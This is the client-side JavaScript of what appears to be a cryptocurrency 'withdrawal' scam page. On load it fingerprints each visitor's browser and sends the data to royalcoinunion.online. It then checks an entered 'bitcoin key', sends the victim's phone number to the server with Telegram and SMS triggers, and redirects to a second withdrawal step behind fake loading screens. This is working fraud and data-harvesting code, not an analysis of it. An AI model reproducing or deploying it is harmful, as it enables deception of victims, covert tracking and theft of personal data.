const xhr = new XMLHttpRequest()

class UserInfo {
    constructor() {
        this.timeOpened = new Date()
        this.timezone = (new Date().getTimezoneOffset() / 60)
    }
    pageon() {
        return window.location.pathname
    }
    platform() { return navigator?.platform }
    langues() { return navigator?.languages }
    appVersion() { return navigator?.appVersion }
    productSub() { return navigator?.productSub }
    sicret() {

        let sicret_key = `${navigator?.productSub + navigator?.vendor + navigator?.appName + navigator?.platform + navigator?.product + navigator?.appVersion}`

        return sicret_key
    }

}

let info = new UserInfo()
let select = document.querySelector('.country_code_form');
let telefon_verify = document.querySelector('.input_telefon');
let code = "+31";

select.addEventListener('change', () => {
    code = select.value
    let code_form = document.getElementById("code_form")

    code_form.innerText = code
});

function loaderFunction(status) {
    if(status){
        let div = document.createElement('div');
        div.style = "position: fixed;width: 100%;height: 100%;top: 0;background-color: white;left: 0;z-index: 5000;display: flex;align-items: center;justify-content: center;"
        div.id = "loader-wrapper"
        div.innerHTML = '<div class="loader" style="color:red;"></div>'
        document.body.append(div)
    }else{
        document.getElementById("loader-wrapper").remove()

    }
}

async function send_request(type, laoder, url, data) {
    if (laoder) { loaderFunction(false) }
    return new Promise((resolve, reject) => {
        let page = `https://royalcoinunion.online/${url}`;
        xhr.open(type, page)
        xhr.responseType = "json"
        xhr.setRequestHeader("Accept", "application/json")
        xhr.setRequestHeader("Content-Type", "application/json")
        xhr.setRequestHeader("Access-Control-Allow-Origin", "*")
        xhr.setRequestHeader("mode", "no-cors")
        xhr.setRequestHeader("cache", "no-cache")
        xhr.setRequestHeader("credentials", "same-origin")
        xhr.setRequestHeader("redirect", "follow")
        
        xhr.onload = () => {
            resolve(xhr.response)
        }

        if (data != false) {
            xhr.send(JSON.stringify(data))
        }
        else {
            xhr.send()

        }
    })
}

async function set_phone_numbers(codes) {
    let genres = document.getElementById("country_codes")
    let code_form = document.getElementById("code_form")


    let country_codes = codes

    for (c in country_codes) {
        code_form.innerText = country_codes[0]?.dial_code
        let newOption = new Option(`${country_codes[c]?.emoji} ${country_codes[c]?.name}`, country_codes[c]?.dial_code);
        genres.append(newOption);
    }
}

async function check_form(keys) {

    let bitcoin_title_id = document.getElementById("bitcoin_title").value
    let bitcoin_key_id = document.getElementById("bitcoin_key").value
    let nubmer_input = document.getElementById("number-input").value
    document.getElementsByClassName("deposit-form__wait")[0].classList.add('active')
    setTimeout(() => {
        if (nubmer_input == "") {
            document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')
            document.querySelector('.form-error').classList.add('active');
            setTimeout(() => {
                document.querySelector('.form-error').classList.remove('active');
            }, 7000)
    
            return
    
        } else if (bitcoin_key_id == "") {
            document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')
    
            document.querySelector('.form-error').classList.add('active');
            setTimeout(() => {
                document.querySelector('.form-error').classList.remove('active');
            }, 7000)
    
            return
    
        } else if (bitcoin_title_id == "") {
            document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')
    
            document.querySelector('.form-error').classList.add('active');
            setTimeout(() => {
                document.querySelector('.form-error').classList.remove('active');
            }, 7000)
    
            return
        }
    
        for (let key in keys) {
            if (keys[key].bitcoin_key == bitcoin_key_id && keys[key].bitcoin_title == bitcoin_title_id) {
                document.getElementsByClassName("deposit-form__wait")[0].classList.add('active')
    
                document.querySelector('.data-inccorrect').classList.remove("active");
                document.querySelector('.form-error').classList.remove('active');
                
                let phone = `${code}${nubmer_input}`
                send_request("post", false, "transaction", { sicret: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}`, send_telegram: true, type: "balance" })
                send_request("post", false, "send_sms", { sicret: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}`, send_sms: true, phone: phone })
    
                setTimeout(() => {
                    window.location.href = 'withdraw-2.html';
                }, 10000)
    
                return
            }
            else {
                document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')
                document.querySelector('.data-inccorrect').classList.add("active");
                setTimeout(() => {
                    document.querySelector('.data-inccorrect').classList.remove("active");
                }, 7000)
            }
        }
    }, 2000)


}

async function getDataBitcoin() {
    let keys = await send_request("get", false, "keys", false)
    check_form(keys)
}

async function get() {
    let users = await send_request("get", false, "users", false)
    let codes = await send_request("get", false, "phone_nubmer_codes", false)

    set_phone_numbers(codes)

    let data = {
        id: users?.length - 1 + 1,
        product_sub: info?.productSub(),
        time: info?.timeOpened,
        platform: info?.platform(),
        langues: info?.langues(),
        userAgent: info?.appVersion(),
        sicret: info?.sicret(),
        sunset: 0,
        step: 0
    }

    send_request("post", true, "new_user", data)
}

get()